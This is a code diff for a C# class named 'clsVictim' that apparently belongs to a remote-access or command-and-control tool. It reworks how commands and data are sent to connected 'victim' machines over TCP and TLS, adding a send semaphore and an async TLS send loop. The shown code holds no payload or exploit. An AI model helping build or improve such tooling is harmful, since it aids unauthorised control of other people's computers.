@@ -35,6 +35,8 @@ namespace winClient48
         public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
         private CancellationTokenSource _tlsCts { get; set; }
 
+        private SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
+
         public clsVictim(Socket socket)
         {
             this.socket = socket;
@@ -50,7 +52,7 @@ namespace winClient48
             m_protocol = enProtocol.TLS;
 
             _tlsCts = new CancellationTokenSource();
-            fnTlsSendLoop(_tlsCts.Token);
+            _ = Task.Run(() => fnTlsSendLoop(_tlsCts.Token));
         }
 
         ~clsVictim()
@@ -80,10 +82,9 @@ namespace winClient48
 
             try
             {
-                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
-                {
-                    socket.EndSend(ar);
-                }), buffer);
+                await _tcpSemaphore.WaitAsync();
+
+                socket.Send(buffer);
             }
             catch
             {
@@ -91,7 +92,7 @@ namespace winClient48
             }
             finally
             {
-                
+                _tcpSemaphore.Release();
             }
         }
 
@@ -102,10 +103,9 @@ namespace winClient48
 
             try
             {
-                socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
-                {
-                    socket.EndSend(ar);
-                }), abBuffer);
+                await _tcpSemaphore.WaitAsync();
+
+                socket.Send(abBuffer);
             }
             catch
             {
@@ -113,7 +113,7 @@ namespace winClient48
             }
             finally
             {
-
+                _tcpSemaphore.Release();
             }
         }
 
@@ -195,29 +195,24 @@ namespace winClient48
             _tlsSendQueue.Add(abData);
         }
 
-        public Task fnTlsSendLoop(CancellationToken ct)
+        public async Task fnTlsSendLoop(CancellationToken ct)
         {
-            return Task.Run(() =>
+            while (!ct.IsCancellationRequested)
             {
-                try
+                if (_tlsSendQueue.TryTake(out var data, Timeout.Infinite, ct))
                 {
-                    foreach (var data in _tlsSendQueue.GetConsumingEnumerable(ct))
+                    try
                     {
-                        Task.Run(() =>
-                        {
-                            m_sslClnt.Write(data, 0, data.Length);
-                            m_sslClnt.Flush();
-                        });
+                        await m_sslClnt.WriteAsync(data, 0, data.Length, ct);
+                        await m_sslClnt.FlushAsync(ct);
+                    }
+                    catch (Exception ex)
+                    {
+                        // log error
+                        break;
                     }
                 }
-                catch (OperationCanceledException)
-                {
-
-                }
-                catch (Exception ex)
-                {
-                }
-            }, ct);
+            }
         }
 
         /// <summary>
@@ -253,7 +248,7 @@ namespace winClient48
             Send(req.fnabGetRequest());
         }
 
-        public async void fnSendCmdParam(int nCmd, int nParam)
+        public void fnSendCmdParam(int nCmd, int nParam)
         {
             string szMsg = clsEZData.fnGenerateRandomStr();
             byte[] abData = Encoding.UTF8.GetBytes(szMsg);
